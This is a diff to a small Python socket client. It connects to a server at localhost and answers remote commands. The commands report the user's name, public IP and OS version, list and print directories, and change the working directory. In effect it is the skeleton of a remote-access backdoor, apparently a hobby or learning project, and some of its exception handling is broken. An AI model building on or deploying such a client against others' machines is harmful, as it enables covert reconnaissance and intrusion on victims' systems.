@@ -1,34 +1,15 @@
-from glob import glob
-from lib2to3.pytree import convert
 import os
-import requests
-import json
 import platform
-import discord
-from discord.ext import commands
 import socket
-import getpass
-import subprocess
-
-# Gets username l
-user = getpass.getuser()
-
-# Gets the users IP
-user_ip = requests.get("https://icanhazip.com").text
-
-# Gets the OS and version and combines them
-theOs     =    platform.system()
-theOsVer  =    platform.version()
-theOsSt   =    theOs + " " + theOsVer
-
-# Server information
-global SERVER_IP 
-global SERVER_PORT
+from getpass import getuser
+from requests import get as r_get
 
 class ClientSetup:
-    # Declaring socket using INET IPv4 and TCP too
-    def __init__(self):
+    def __init__(self, server:str, port:int, client_ip:str):
         self.in_socket:socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server = server
+        self.port = port
+        self.client_ip = client_ip
         self.connect_to_server()
     
 
@@ -37,13 +18,14 @@ class ClientSetup:
 
 
     def connect_to_server(self):
-        # Connect to the server
-        ip          = SERVER_IP
-        port:int    = SERVER_PORT
+        print(self.client_ip)
         try:
-            self.in_socket.connect((ip, port))
+            self.in_socket.connect((self.server, self.port))
         except ConnectionRefusedError:
             print("Server down")
+            os._exit(1)
+        except OverflowError or OSError:
+            print(f"Client Configuration is incorrect! Is {self.port} a valid port?")
             os._exit(1)
 
         while True:
@@ -51,21 +33,53 @@ class ClientSetup:
 
             if cmd == "TEST":
                 self.in_socket.send(ClientSetup.convert_byte("CONNECTED"))
-            if cmd == "user":
-                self.in_socket.send(ClientSetup.convert_byte(f"Username {user}"))
-            if cmd == "ip":
-                self.in_socket.send(ClientSetup.convert_byte(f"IP {user_ip}"))
-            if cmd == "osIn":
-                self.in_socket.send(ClientSetup.convert_byte(f"Platform {theOsSt}"))
-            if cmd == "check":
-                self.in_socket.send(ClientSetup.convert_byte("checked"))
-            if cmd == "close":
+
+            elif cmd == "GETUSER".lower():
+                user = getuser()
+                self.in_socket.send(ClientSetup.convert_byte(f"Username: {user}"))
+
+            elif cmd == "GETIP".lower():
+                self.in_socket.send(ClientSetup.convert_byte(f"IP: {self.client_ip}"))
+            
+            elif cmd == "GETOS".lower():
+                OS_INFO = platform.system() + " " + platform.version()
+                self.in_socket.send(ClientSetup.convert_byte(f"OS: {OS_INFO}"))
+            
+            elif cmd == "LISTDIR":
+                dir_files = os.listdir()
+                dir_files = str(dir_files)
+                self.in_socket.send(ClientSetup.convert_byte(f"{dir_files}"))
+
+            elif cmd == "PWD":
+                get_path = os.getcwd()
+                self.in_socket.send(ClientSetup.convert_byte(f"{get_path}"))
+
+            elif str(cmd).startswith("CD"):
+                print(cmd)
+                dir_path = str(cmd[2:]).replace("-", " ")
+                print(dir_path)
+                try:
+                    os.chdir(dir_path)
+                    msg = "Changed to " + os.getcwd()
+                except OSError or ValueError as e:
+                    msg = f"Invalid Path Was Given"
+                self.in_socket.send(ClientSetup.convert_byte(f"{msg}"))
+
+            elif cmd == "CLOSE".lower():
                 self.in_socket.close()
                 break
+            else:
+                self.in_socket.send(ClientSetup.convert_byte("Invalid Command"))
+                continue
             
 
 
 if __name__ == "__main__":
+    try:
+        client_ip = r_get("https://icanhazip.com").text.replace("\n", "")
+    except:
+        client_ip = "IP: ??"
+    
     SERVER_IP = "127.0.0.1"
     SERVER_PORT = 3334
-    ClientSetup()
+    ClientSetup(server=SERVER_IP, port=SERVER_PORT, client_ip=client_ip)
